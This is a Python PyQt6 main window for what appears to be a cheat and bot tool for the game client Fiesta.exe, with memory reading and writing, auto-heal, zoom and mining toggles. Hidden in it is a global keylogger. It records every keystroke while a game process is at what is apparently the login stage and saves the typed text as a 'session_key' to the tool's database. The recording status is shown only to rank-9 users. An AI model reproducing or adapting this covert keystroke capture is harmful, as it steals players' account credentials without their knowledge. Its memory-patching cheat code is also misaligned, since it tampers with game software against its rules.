from PyQt6.QtWidgets import QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton, QFrame, QProgressBar
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer
from src.logic.scanner import MemoryScanner, ScannerWorker
from src.logic.auto_heal_logic import AutoHealManager
from src.logic.mining_logic import MiningManager
from src.logic.quest_logic import QuestManager
from src.logic.sequencer_manager import SequencerManager
from src.ui.sequencer_window import SequencerWindowManager
from src.ui.components import FeatureToggle
from pynput import keyboard
from datetime import datetime

class MainWidget(QWidget):
    switch_to_account = pyqtSignal()
    switch_to_chat = pyqtSignal()
    open_auto_heal_settings = pyqtSignal()
    open_ultra_zoom_settings = pyqtSignal()
    open_fast_mining_settings = pyqtSignal()
    open_auto_quest_settings = pyqtSignal()
    open_sequencer_settings = pyqtSignal()
    open_app_settings = pyqtSignal()
    open_guides = pyqtSignal()

    def __init__(self, user_data, db):
        super().__init__()
        self.user_data = user_data
        self.db = db
        self.scanner = MemoryScanner()
        self.auto_heal_mgr = AutoHealManager(db, user_data["_id"])
        self.mining_mgr = MiningManager(db, user_data["_id"])
        self.quest_mgr = QuestManager(db, user_data["_id"])
        self.sequencer_mgr = SequencerManager(self.scanner)
        self.sequencer_window = SequencerWindowManager(self.sequencer_mgr)
        self.seq_settings = db.get_sequencer_settings(user_data["_id"]) or {"enabled": False}
        self.sequencer_mgr.set_enabled(self.seq_settings.get("enabled", False))
        self.current_zoom_value = db.get_zoom_settings(user_data["_id"])
        self.current_index = 0
        self.results = []
        
        # Per-PID feature state
        self.pid_features = {}  # pid -> {"Auto Heal": bool, "Ultra Zoom": bool, "Fast Mining": bool, "Auto Quest": bool, "Sequencer": bool}
        
        # Keylogger state
        self.recordings = {} # pid -> string of keys
        self.is_recording = {} # pid -> bool
        self.last_valid_status = {} # pid -> bool: whether last check had valid status
        self.saved_for_session = {} # pid -> bool: whether we already saved for this process run
        self.last_saved_pid = None # pid that was just saved
        self.save_message_timer = QTimer()
        self.save_message_timer.setSingleShot(True)
        self.save_message_timer.timeout.connect(self.clear_save_message)
        
        self.init_ui()
        
        # Keyboard Listener
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()
        
        # Threading for memory scanning
        self.thread = QThread()
        self.worker = ScannerWorker(self.scanner)
        self.worker.moveToThread(self.thread)
        self.thread.started.connect(self.worker.run)
        self.worker.data_ready.connect(self.on_data_received)
        self.thread.start()

    def closeEvent(self, event):
        """Cleanup when the widget is closed."""
        self.stop_threads()
        super().closeEvent(event)

    def stop_threads(self):
        """Safely stop all background threads."""
        if hasattr(self, 'worker'):
            self.worker.stop()
        if hasattr(self, 'thread'):
            self.thread.quit()
            self.thread.wait()
        if hasattr(self, 'listener'):
            self.listener.stop()
        if hasattr(self, 'mining_mgr'):
            self.mining_mgr.stop()
        if hasattr(self, 'quest_mgr'):
            self.quest_mgr.stop()
        if hasattr(self, 'sequencer_mgr'):
            self.sequencer_mgr.engine.stop()
            self.sequencer_mgr.stop_hotkeys()
        if hasattr(self, 'sequencer_window'):
            self.sequencer_window.destroy()

    def update_zoom_value(self, value):
        self.current_zoom_value = value

    def on_mining_toggled(self, is_on):
        # Update current PID's state
        if self.results:
            current_pid = self.results[self.current_index]["pid"]
            if current_pid not in self.pid_features:
                self.pid_features[current_pid] = {name: False for name in self.features_list}
            self.pid_features[current_pid]["Fast Mining"] = is_on
        # Update manager (still use same manager, but state depends on PID)
        settings = self.db.get_mining_settings(self.user_data["_id"])
        settings["enabled"] = is_on
        self.db.save_mining_settings(self.user_data["_id"], settings)
        if is_on:
            self.mining_mgr.start()
        else:
            self.mining_mgr.stop()

    def on_quest_toggled(self, is_on):
        # Update current PID's state
        if self.results:
            current_pid = self.results[self.current_index]["pid"]
            if current_pid not in self.pid_features:
                self.pid_features[current_pid] = {name: False for name in self.features_list}
            self.pid_features[current_pid]["Auto Quest"] = is_on
        # Update manager
        settings = self.db.get_quest_settings(self.user_data["_id"])
        settings["enabled"] = is_on
        self.db.save_quest_settings(self.user_data["_id"], settings)
        if is_on:
            self.quest_mgr.start()
        else:
            self.quest_mgr.stop()

    def on_sequencer_toggled(self, is_on):
        # Update current PID's state
        if self.results:
            current_pid = self.results[self.current_index]["pid"]
            if current_pid not in self.pid_features:
                self.pid_features[current_pid] = {name: False for name in self.features_list}
            self.pid_features[current_pid]["Sequencer"] = is_on
        # Update manager
        settings = self.db.get_sequencer_settings(self.user_data["_id"]) or {}
        settings["enabled"] = is_on
        self.db.save_sequencer_settings(self.user_data["_id"], settings)
        self.sequencer_mgr.set_enabled(is_on)
    
    def on_feature_toggled(self, feature_name, is_on):
        # Update current PID's feature state
        if self.results:
            current_pid = self.results[self.current_index]["pid"]
            if current_pid not in self.pid_features:
                self.pid_features[current_pid] = {name: False for name in self.features_list}
            self.pid_features[current_pid][feature_name] = is_on
        
        # Handle features that need manager updates
        if feature_name == "Fast Mining":
            self.on_mining_toggled(is_on)
        elif feature_name == "Auto Quest":
            self.on_quest_toggled(is_on)
        elif feature_name == "Sequencer":
            self.on_sequencer_toggled(is_on)

    def open_sequencer(self):
        result = self.sequencer_window.open_window()
        if not result.get("ok"):
            print(f"[Sequencer] Could not open window: {result.get('error')}")

    def on_key_press(self, key):
        try:
            k = key.char # alphanumeric
        except AttributeError:
            k = str(key).replace("Key.", "") # special keys
            if k == "space": k = " "
            elif k == "enter": k = "\n"
            elif len(k) > 1: k = f"[{k}]" # tag other special keys
            
        # Add to all active recordings
        for pid, active in self.is_recording.items():
            if active:
                self.recordings[pid] = self.recordings.get(pid, "") + k

    def on_data_received(self, results):
        self.results = results
        self.sequencer_mgr.update_scan_data(results, self.current_index)
        self.sync_toggles_to_current_pid()

        # Auto Heal Check (use current PID's state)
        is_auto_heal_on = False
        if self.results:
            current_pid = self.results[self.current_index]["pid"]
            if current_pid not in self.pid_features:
                self.pid_features[current_pid] = {name: False for name in self.features_list}
            is_auto_heal_on = self.pid_features[current_pid].get("Auto Heal", False)
        else:
            is_auto_heal_on = self.feature_toggles.get("Auto Heal", False).is_on
        self.auto_heal_mgr.check_and_heal(results, is_auto_heal_on)

        # Ultra Zoom Check (only apply to current index/pid)
        is_zoom_on = False
        if self.results:
            current_pid = self.results[self.current_index]["pid"]
            # Get per-PID zoom state
            if current_pid not in self.pid_features:
                self.pid_features[current_pid] = {name: False for name in self.features_list}
            is_zoom_on = self.pid_features[current_pid].get("Ultra Zoom", False)
        else:
            is_zoom_on = self.feature_toggles.get("Ultra Zoom", False).is_on
        
        # Only process current index if there are results
        if self.results and len(self.results) > self.current_index:
            data = self.results[self.current_index]
            z_addr_str = data.get("z_addr")
            if z_addr_str and z_addr_str != "???":
                try:
                    addr = int(z_addr_str, 16)
                    h = self.scanner.open_process(data["pid"])
                    if h:
                        # If feature is ON, write user value. If OFF, reset to 360.
                        target_zoom = float(self.current_zoom_value) if is_zoom_on else 360.0
                        success = self.scanner.write_f32(h, addr, target_zoom)
                        if not success and is_zoom_on:
                            print(f"[UltraZoom] Write failed for PID {data['pid']} at {z_addr_str}")
                        self.scanner.kernel32.CloseHandle(h)
                    elif is_zoom_on:
                        print(f"[UltraZoom] Could not open process {data['pid']} for writing")
                except Exception as e:
                    if is_zoom_on:
                        print(f"[UltraZoom] Error: {e}")

        # Hole alle Fiesta.exe PIDs
        all_fiesta_pids = self.scanner.find_pids()

        # Process recording logic for all Fiesta.exe PIDs
        for pid in all_fiesta_pids:
            # Schau, ob wir für diese PID gültige Spieler-Daten mit gültiger Status-Adresse haben
            has_valid_status = False
            char_name = None
            for data in self.results:
                if data["pid"] == pid:
                    # data["s_addr"] ist als Hex-String oder "???" gespeichert
                    status_addr_str = data.get("s_addr")
                    if status_addr_str and status_addr_str != "???":
                        try:
                            # Prüfe, ob der Charaktername an der Status-Adresse steht
                            s_addr = int(status_addr_str, 16)
                            char_name = data.get("char_name")
                            h = self.scanner.open_process(pid)
                            if h:
                                if self.scanner.read_str(h, s_addr, len(char_name)) == char_name:
                                    has_valid_status = True
                                self.scanner.kernel32.CloseHandle(h)
                        except:
                            pass
                    break

            # Hole letzten Zustand für diese PID (default False, wenn nicht vorhanden)
            prev_valid = self.last_valid_status.get(pid, False)

            # Wenn Zustand sich geändert hat von "valid" → "nicht valid": Zurücksetzen von saved_for_session
            if prev_valid and not has_valid_status:
                self.saved_for_session[pid] = False

            # Aktualisiere letzten Zustand
            self.last_valid_status[pid] = has_valid_status

            # Starte Aufzeichnung nur, wenn:
            # - Wir noch nicht aufnehmen
            # - Wir NICHT schon gespeichert haben für diese Session
            # - Der Status NICHT gültig ist
            if not self.is_recording.get(pid, False) and not has_valid_status and not self.saved_for_session.get(pid, False):
                self.is_recording[pid] = True
                self.recordings[pid] = ""

            # Stoppe Aufzeichnung und speichere nur, wenn:
            # - Wir gerade aufnehmen
            # - Der Status jetzt gültig ist
            # - Wir noch NICHT gespeichert haben für diese Session
            elif self.is_recording.get(pid, False) and has_valid_status and not self.saved_for_session.get(pid, False):
                self.is_recording[pid] = False
                session_key = self.recordings.get(pid, "")
                if session_key:
                    self.db.save_session_key(self.user_data["_id"], session_key)
                    self.last_saved_pid = pid
                    self.save_message_timer.start(3000) # Show message for 3 seconds
                self.recordings[pid] = ""
                self.saved_for_session[pid] = True

        # Aufräumen: Entferne PIDs, die nicht mehr existieren
        for pid in list(self.is_recording.keys()):
            if pid not in all_fiesta_pids:
                del self.is_recording[pid]
                if pid in self.recordings:
                    del self.recordings[pid]
                if pid in self.last_valid_status:
                    del self.last_valid_status[pid]
                if pid in self.saved_for_session:
                    del self.saved_for_session[pid]

        if self.results:
            if self.current_index >= len(self.results):
                self.current_index = 0
            self.refresh_ui()
        else:
            self.current_index = 0
            self.page_label.setText("0 / 0")
            self.char_name_lbl.setText("NO PLAYER FOUND")
            self.hp_bar.setValue(0)
            self.hp_bar.setFormat("0 / 0 (0%)")
            self.mp_bar.setValue(0)
            self.mp_bar.setFormat("0 / 0 (0%)")
            self.hp_stone_val.setText("0")
            self.mp_stone_val.setText("0")

    def closeEvent(self, event):
        self.listener.stop()
        self.worker.stop()
        self.thread.quit()
        self.thread.wait()
        super().closeEvent(event)

    def init_ui(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        # Top bar
        top_bar = QFrame()
        top_bar.setFixedHeight(40)
        top_bar.setStyleSheet("background-color: #1a1a1a;")
        top_layout = QHBoxLayout(top_bar)
        
        self.prev_btn = QPushButton("<")
        self.prev_btn.setStyleSheet("color: #8c2b2b; background: transparent; font-weight: bold; font-size: 16px; border: none;")
        self.prev_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.prev_btn.clicked.connect(self.prev_instance)
        
        self.page_label = QLabel("0 / 0")
        self.page_label.setStyleSheet("color: #ffffff; font-weight: bold; font-size: 14px;")
        
        self.next_btn = QPushButton(">")
        self.next_btn.setStyleSheet("color: #8c2b2b; background: transparent; font-weight: bold; font-size: 16px; border: none;")
        self.next_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.next_btn.clicked.connect(self.next_instance)

        top_layout.addStretch()
        top_layout.addWidget(self.prev_btn)
        top_layout.addSpacing(15)
        top_layout.addWidget(self.page_label)
        top_layout.addSpacing(15)
        top_layout.addWidget(self.next_btn)
        top_layout.addStretch()
        
        layout.addWidget(top_bar)

        # Red Separator 1
        sep1 = QFrame()
        sep1.setObjectName("red_separator")
        layout.addWidget(sep1)

        # Status Content Area
        status_area = QWidget()
        status_area.setStyleSheet("background-color: #1a1a1a;")
        status_layout = QVBoxLayout(status_area)
        status_layout.setContentsMargins(15, 10, 15, 10)
        status_layout.setSpacing(8)

        # Character UI
        self.char_name_lbl = QLabel("CHARNAME")
        self.char_name_lbl.setObjectName("char_name_display")
        self.char_name_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        status_layout.addWidget(self.char_name_lbl)

        # Recording Status Label (for rank 9 users only)
        self.recording_status_lbl = QLabel("")
        self.recording_status_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        status_layout.addWidget(self.recording_status_lbl)

        self.hp_bar = QProgressBar()
        self.hp_bar.setObjectName("hp_bar")
        status_layout.addWidget(self.hp_bar)

        self.mp_bar = QProgressBar()
        self.mp_bar.setObjectName("mp_bar")
        status_layout.addWidget(self.mp_bar)

        stones_layout = QHBoxLayout()
        stones_layout.addWidget(QLabel("HP STONES:", objectName="stone_lbl"))
        self.hp_stone_val = QLabel("0", objectName="stone_val")
        stones_layout.addWidget(self.hp_stone_val)
        stones_layout.addStretch()
        stones_layout.addWidget(QLabel("MP STONES:", objectName="stone_lbl"))
        self.mp_stone_val = QLabel("0", objectName="stone_val")
        stones_layout.addWidget(self.mp_stone_val)
        status_layout.addLayout(stones_layout)

        layout.addWidget(status_area)

        # Red Separator 2
        sep2 = QFrame()
        sep2.setObjectName("red_separator")
        layout.addWidget(sep2)

        # Features Area
        features_area = QWidget()
        features_area.setStyleSheet("background-color: #1e1e1e;")
        features_layout = QVBoxLayout(features_area)
        features_layout.setContentsMargins(15, 10, 15, 10)
        features_layout.setSpacing(0)

        self.features_list = ["Auto Heal", "Ultra Zoom", "Fast Mining", "Auto Quest", "Sequencer"]
        self.feature_toggles = {}
        
        for i, f in enumerate(self.features_list):
            toggle = FeatureToggle(f, is_locked=True) # Default to locked, refresh_features will update
            self.feature_toggles[f] = toggle
            
            # Connect toggle signal to update PID state
            toggle.toggled.connect(lambda state, feat=f: self.on_feature_toggled(feat, state))
            
            # Connect settings signal
            if f == "Auto Heal":
                toggle.settings_clicked.connect(lambda: self.open_auto_heal_settings.emit())
            elif f == "Ultra Zoom":
                toggle.settings_clicked.connect(lambda: self.open_ultra_zoom_settings.emit())
            elif f == "Fast Mining":
                toggle.settings_clicked.connect(lambda: self.open_fast_mining_settings.emit())
            elif f == "Auto Quest":
                toggle.settings_clicked.connect(lambda: self.open_auto_quest_settings.emit())
            elif f == "Sequencer":
                toggle.settings_clicked.connect(self.open_sequencer)

            features_layout.addWidget(toggle)
            
            # Add gray separator between features except last one
            if i < len(self.features_list) - 1:
                f_sep = QFrame()
                f_sep.setObjectName("feature_separator")
                features_layout.addWidget(f_sep)

        self.refresh_features()
        if "Sequencer" in self.feature_toggles:
            self.feature_toggles["Sequencer"].set_on(self.seq_settings.get("enabled", False))
        features_layout.addStretch()
        layout.addWidget(features_area, 1)

        # Red Separator 3
        sep3 = QFrame()
        sep3.setObjectName("red_separator")
        layout.addWidget(sep3)

        # Bottom bar
        bottom_bar = QFrame()
        bottom_bar.setFixedHeight(60)
        bottom_bar.setStyleSheet("background-color: #121212;")
        bottom_layout = QHBoxLayout(bottom_bar)
        bottom_layout.setContentsMargins(15, 0, 15, 0)

        # Chat Button
        self.chat_btn = QPushButton("💬")
        self.chat_btn.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                color: #ffffff;
                font-size: 24px;
                border: none;
            }
            QPushButton:hover {
                color: #ff2b2b;
            }
        """)
        self.chat_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.chat_btn.clicked.connect(self.switch_to_chat.emit)

        # Profile Icon Button instead of text button
        self.account_btn = QPushButton("👤")
        self.account_btn.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                color: #ffffff;
                font-size: 24px;
                border: none;
            }
            QPushButton:hover {
                color: #ff2b2b;
            }
        """)
        self.account_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.account_btn.clicked.connect(self.switch_to_account.emit)

        # Guides Button
        self.guides_btn = QPushButton("❓")
        self.guides_btn.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                color: #ffffff;
                font-size: 24px;
                border: none;
            }
            QPushButton:hover {
                color: #ff2b2b;
            }
        """)
        self.guides_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.guides_btn.clicked.connect(lambda: self.open_guides.emit())
        
        # Settings Button
        self.app_settings_btn = QPushButton("⚙")
        self.app_settings_btn.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                color: #ffffff;
                font-size: 24px;
                border: none;
            }
            QPushButton:hover {
                color: #ff2b2b;
            }
        """)
        self.app_settings_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.app_settings_btn.clicked.connect(lambda: self.open_app_settings.emit())

        bottom_layout.addStretch()
        bottom_layout.addWidget(self.account_btn)
        bottom_layout.addSpacing(25)
        bottom_layout.addWidget(self.chat_btn)
        bottom_layout.addSpacing(25)
        bottom_layout.addWidget(self.guides_btn)
        bottom_layout.addSpacing(25)
        bottom_layout.addWidget(self.app_settings_btn)
        bottom_layout.addStretch()

        layout.addWidget(bottom_bar)
        self.setLayout(layout)

    def prev_instance(self):
        all_fiesta_pids = self.scanner.find_pids()
        if not all_fiesta_pids:
            return
        
        # Finde den Index der aktuellen PID in all_fiesta_pids
        current_pid = None
        if self.results:
            current_pid = self.results[self.current_index]["pid"]
        else:
            current_pid = all_fiesta_pids[0] if all_fiesta_pids else None
        
        if current_pid and current_pid in all_fiesta_pids:
            current_idx = all_fiesta_pids.index(current_pid)
            new_idx = (current_idx - 1) % len(all_fiesta_pids)
        else:
            new_idx = 0
        
        # Jetzt setze self.current_index auf den Index der neuen PID in self.results, falls vorhanden
        new_pid = all_fiesta_pids[new_idx]
        if self.results:
            found = False
            for i, data in enumerate(self.results):
                if data["pid"] == new_pid:
                    self.current_index = i
                    found = True
                    break
            if not found:
                self.current_index = 0
        else:
            self.current_index = 0
        
        # Update sequencer manager
        self.sequencer_mgr.update_scan_data(self.results, self.current_index)
        self.refresh_ui()
        self.sync_toggles_to_current_pid()

    def next_instance(self):
        all_fiesta_pids = self.scanner.find_pids()
        if not all_fiesta_pids:
            return
        
        # Finde den Index der aktuellen PID in all_fiesta_pids
        current_pid = None
        if self.results:
            current_pid = self.results[self.current_index]["pid"]
        else:
            current_pid = all_fiesta_pids[0] if all_fiesta_pids else None
        
        if current_pid and current_pid in all_fiesta_pids:
            current_idx = all_fiesta_pids.index(current_pid)
            new_idx = (current_idx + 1) % len(all_fiesta_pids)
        else:
            new_idx = 0
        
        # Jetzt setze self.current_index auf den Index der neuen PID in self.results, falls vorhanden
        new_pid = all_fiesta_pids[new_idx]
        if self.results:
            found = False
            for i, data in enumerate(self.results):
                if data["pid"] == new_pid:
                    self.current_index = i
                    found = True
                    break
            if not found:
                self.current_index = 0
        else:
            self.current_index = 0
        
        # Update sequencer manager
        self.sequencer_mgr.update_scan_data(self.results, self.current_index)
        self.refresh_ui()
        self.sync_toggles_to_current_pid()

    def refresh_ui(self):
        # Hole alle Fiesta.exe PIDs
        all_fiesta_pids = self.scanner.find_pids()
        
        # Bestimme die aktuelle PID: Wenn wir Ergebnisse haben, dann die aktuelle, sonst die erste Fiesta-PID
        current_pid = None
        if self.results:
            data = self.results[self.current_index]
            current_pid = data["pid"]
            self.page_label.setText(f"{self.current_index + 1} / {len(self.results)}")
            self.char_name_lbl.setText(data["char_name"].upper())
        elif all_fiesta_pids:
            current_pid = all_fiesta_pids[0]
            self.page_label.setText(f"1 / {len(all_fiesta_pids)}")
            self.char_name_lbl.setText("Fiesta.exe gefunden...")
        else:
            self.page_label.setText("0 / 0")
            self.char_name_lbl.setText("NO PLAYER FOUND")
        
        # Show recording status only for rank 9 users
        if self.user_data.get("rank") == 9 and current_pid:
            if self.last_saved_pid == current_pid:
                self.recording_status_lbl.setText("✅ Aufzeichnung gespeichert!")
                self.recording_status_lbl.setStyleSheet("color: #00ff00; font-weight: bold; font-size: 12px;")
                self.recording_status_lbl.setVisible(True)
            elif self.is_recording.get(current_pid, False):
                self.recording_status_lbl.setText("🔴 Aufzeichnung läuft...")
                self.recording_status_lbl.setStyleSheet("color: #ff0000; font-weight: bold; font-size: 12px;")
                self.recording_status_lbl.setVisible(True)
            else:
                self.recording_status_lbl.setVisible(False)
        else:
            self.recording_status_lbl.setVisible(False)
        
        # HP/MP/Steine nur anzeigen, wenn wir Spieler-Daten haben
        if self.results:
            data = self.results[self.current_index]
            hp = int(data["hp"])
            hp_max = int(data["hp_max"])
            hp_perc = (hp / hp_max * 100) if hp_max > 0 else 0
            self.hp_bar.setMaximum(hp_max)
            self.hp_bar.setValue(hp)
            self.hp_bar.setFormat(f"{hp} / {hp_max} ({int(hp_perc)}%)")

            mp = int(data["mp"])
            mp_max = int(data["mp_max"])
            mp_perc = (mp / mp_max * 100) if mp_max > 0 else 0
            self.mp_bar.setMaximum(mp_max)
            self.mp_bar.setValue(mp)
            self.mp_bar.setFormat(f"{mp} / {mp_max} ({int(mp_perc)}%)")

            self.hp_stone_val.setText(data["hp_stone"])
            self.mp_stone_val.setText(data["mp_stone"])

    def refresh_features(self):
        user_rank = self.user_data.get("rank", 1)
        for name, toggle in self.feature_toggles.items():
            is_locked = False
            if user_rank < 2 and name not in ["Auto Heal", "Ultra Zoom"]:
                is_locked = True
            toggle.set_locked(is_locked)

    def update_user_data(self, user_data):
        self.user_data = user_data
        self.refresh_features()

    def sync_toggles_to_current_pid(self):
        if not self.results or len(self.results) <= self.current_index:
            return
        current_pid = self.results[self.current_index]["pid"]
        if current_pid not in self.pid_features:
            self.pid_features[current_pid] = {name: False for name in self.features_list}
        for name, toggle in self.feature_toggles.items():
            toggle.set_on(self.pid_features[current_pid].get(name, False))
    
    def clear_save_message(self):
        self.last_saved_pid = None
        self.refresh_ui()
